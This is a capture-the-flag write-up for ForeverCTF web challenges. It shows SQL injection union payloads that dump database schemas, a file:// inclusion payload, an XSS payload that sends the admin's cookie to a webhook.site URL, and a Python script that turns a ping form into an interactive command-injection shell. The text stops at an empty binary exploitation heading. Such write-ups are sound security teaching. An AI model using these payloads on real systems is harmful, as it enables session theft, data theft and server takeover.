<h3> ForeverCTF  </h3>

<h3> Challenge Solved: </h3>

__P.S I'll be updating since I haven't really solved all the challs and the ctf is running forever `¯\_(ツ)_/¯`__ </h3>

## Web
- Start at the Source 
- Cookies
- Baby SQLi 
- Local File Inclusion 
- XSS
- Server Side Request Forgery
- Command Injection
- SQLi

## Binary Exploitation
- uint64_t
- Tricky Indices
- Overflow
- Jump
- Shelly Sells Shells
- Params
- Canary in a Coal Mine
- ROP
- Get my GOT
- Leak
- ret2libc
- Printf
- Resolve
- Signals

## Reverse Engineering
- strings
- xor
- Simple Checker
- gdb

## Cryptography
- All Your Base Are Belong To Us
- Zeros and Ones
- All Greek To Me
- DEADBEEF
- Bookwork
- RSA
- Bad Parameters

## Forensics
- Met A Data
- Not Very Significant Message
- Redacted
- Magic
- Zipped
- Dr. Doom's Devious Deletion Dilemma

 ## Miscellaneous
 - Nested Zip

 ## Networking
 - HTTP Objects


### Web 8/8:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c8f9770c-1c58-4c75-a082-202043e60112)

#### Start at the Source 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f400d2ca-8e7c-4a86-a5ec-69bc518ac1a3)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7b6d1659-e78e-4543-b57b-0e6281ea98e4)

Checking the page source gives the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64baed16-debe-4ab9-92f0-86c0c02aa6a1)

```
Flag: utflag{1_l1ke_h1de_&_seek}
```

#### Cookies
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fd8cf95b-efa0-4030-a47a-6291128d8802)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ee338b71-afba-479a-930f-391337b4e2d6)

Checking the cookies available shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/065ebe70-f27a-470d-afd8-11058b418ff4)

I set the `isCookieMonster` to `true` 

And on refreshing the page I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/014558e8-f397-4b56-9b1b-e0efde833614)

```
Flag: utflag{c0ngrat5_tak3_a_byt3}
```

#### Baby SQLi 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/df6e5bd9-c271-4b02-94f9-072422f05541)

We are given this:

```sql
INSERT INTO users(username, password, email) VALUES ('admin', 'utflag{*****************}', 'contact@isss.io');
```

So this means the value stored in column `password` will contain the flag

Moving over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1e403fcc-299a-4c23-9812-d88128aa21ef)

Searching for a valid mail returns the username it belongs to 
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/127159644/252477232-b98b35f8-b8c5-4956-a915-3eadf423d87c.png)

But a non valid mail turns an empty array
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f162a2c0-5c01-4cb6-99fe-3004a81b62b7)

When I inject a single quote `'` it returns error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ccdc987c-86eb-49fb-a0d8-6b8fa9de11e7)

But using `--` comments it and no error is shown
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/79fd4c7f-423f-44f1-9927-04bca149728d)

This means that the web server is vulneable to SQL Injection

We can also tell from the Challenge name 😉

Since only a single table is available and the flag is in the password column. I will use a `union` query to get that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6221124d-4394-42c3-a4b5-912586b3b50e)

```r
Payload: ' union select password from users --
```

And I got the flag

```
Flag: utflag{wow_lets_unionize}
```

#### Local File Inclusion 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09035a6c-4351-4f83-a4ca-beb5de45670f)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ab466005-b7ed-4df6-855a-863d00fbe86f)

I tried including `google.com` and it returns the content
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1715f839-b09f-460a-8607-b7df10a905f8)

One thing we should know is that not only `http and https` are the url protocols there's also `gopher, ftp, file etc.` 

The `file` protocol can be used in this case

We are already given the flag location to be at `/` 

Let us get it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6adf3015-86bf-4d67-ac1f-2743c0c41949)

```
Payload: file:///flag.txt
```

And I get the flag

```
Flag: utflag{g0t_y0ur_r3s0urc3!}
```

#### XSS
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c9b4ce77-3d13-48f3-b704-97f148f5b916)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/797af4c8-143f-4a67-996a-f9ce532f9ecf)

Giving it input shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff0cefde-8297-4cb8-8bbd-3e54085ee5d0)

When I clicked on the url it gave I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4118d0ea-e60d-4345-980e-24c435ceedc1)

And it is just in the form tag 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0e62e1c6-7926-4dd1-b3b1-93d4fd910f42)

I can try inject html tags 

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/417941d0-9723-4c7e-a4ec-f661debf4687)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/241c8bea-a00f-44f7-b488-4f72c064c5ec)

From the challenge description the flag is in the admin cookie

So from this vulnerability which is of cause Cross Site Scripting (XSS) we can steal the admin cookie

But when I tried injecting a `alert` tag I got error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3cb7f975-4b51-4c52-9fc6-044602e3abef)

Luckily I don't even need that to steal the admin cookie

Here's the payload I used
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fc4c9b11-f085-42d1-b04d-82c4c5f85df8)

```
<img src=x onerror=this.src='https://webhook.site/04fe7606-2bda-443a-a66e-37be76febc63/?'+document.cookie;>
```

Back on the [webhook](https://webhook.site) site I got multiple http requess and each one contains the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c31dc362-1380-44cf-bef0-899634b2e0c3)

```
Flag: utflag{boop_beep_ddj333}
```

#### Server Side Request Forgery
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/58e97247-e19e-4289-8a1e-ef278ac6594d)

Accessing the url shows this error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/76e62907-9313-4072-9fa9-4c9ec0e7ee2d)

```
Sorry, only cool kids on the internal network are allowed to login.
```

I then accessed `http://forever.isss.io:4225/` and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d2293dfb-fcd0-4024-a6ab-337695cbb159)

We can try using `file` protocol to read local files
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1c4e3b0f-32e0-4a6e-a21d-2efe602ce1f4)

But we need the flag

The challenge name has already given us the hint of solving this which is a Server Side Request Forgery (SSRF) vulnerability

With this vulnerability we can access internal services running on the host

What we would want to access is `{url}/flag` 

Doing that I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0d6c771a-87f2-46ac-88e1-45e21cc632fb)

```
Flag: utflag{SSRF_isnt_so_bad_after_all}
```

#### Command Injection 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a1c84911-23d5-4c50-b8fe-608e8a0f0a3a)

The source code is given

After downloading it reading the content gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca9346df-ba7f-470d-a026-2f2eb8142d3b)

```python
from flask import *
import subprocess
app = Flask(__name__)

@app.route('/', methods=['POST','GET'])
def index():
    if request.method == 'POST':
        url = request.form.get('url')
        if not url is None:
            command = 'ping -c 1 '+url
            p = subprocess.run(command, shell=True, capture_output=True)
            content = p.stdout.decode('ascii')
            return render_template('index.html', content=content)
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

We can see that if the request made is a `GET` request it returns the content of `index.html` else if the http request method is `POST` it gets the content of the url from the request form and does a ping command on the url sent 

Since the command is passed through subprocess and shell is set to True we can get command injection 🙂

Here's my script for it

```python
#!/usr/bin/python3
import requests
import re

while True:
    try:
        command = input('$ ')
        if command.lower() != 'q':
            url = 'http://forever.isss.io:4223'
            req = requests.post(url, data={"url":f";{command}"})
            
            # Extract value within <code> tags using regular expression >3
            pattern = r"<code>(.*?)</code>"
            match = re.search(pattern, req.text, re.DOTALL)
            
            if match:
                code_value = match.group(1)
                print(code_value)
            else:
                print("No value found within <code> tags.")
        
        else:
            exit()
    except Exception as e:
        print(e)
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/483c9ed9-dc59-4f3f-aeb0-f9918819d3d0)

```
Flag: utflag{c0mmand_1nj3ct3d!}
```

#### SQLi
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5277b34a-fd94-4c4f-9fd1-ac2d6dba3cd0)

We are given this

```sql
 INSERT INTO ***********(***********, ***********, ***********) VALUES ('admin', 'utflag{*****************}', 'contact@isss.io');
```

Since this is a sequel to Baby SQLi 

I'll go straight to exploitation

In this case we don't know the table nor the column where the flag is stored

But we can of cause get it 😉

First let us dump all the tables
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f9769f93-9c57-4c4b-81f3-f7efc7a47c7e)

```r
Payload: ' union select table_name from information_schema.tables --
```

Looking at the result I found this table name fishy
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/184e5ffb-8a07-4f51-91d5-fced1757f3c3)

```
secret_users_table_sfd33
```

Seems like it's the right table 🤔

Let us check the coulumns there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff620291-2e0f-488d-8804-f09c6435491d)

```
Payload: ' union select column_name from information_schema.columns where table_name = 'secret_users_table_sfd33' --
```

At this point we would want to dump the `passfrase` column from the `secret_users_table_sfd33` table
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/73c7b399-4f4b-4580-bf72-c9a48feb8c4d)

```
Payload: ' union select passfrase from secret_users_table_sfd33 --
```

### Binary Exploitation 14/14:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/efdaedac-30c9-441d-98a9-0f760ebd995c)

#### uint64_t
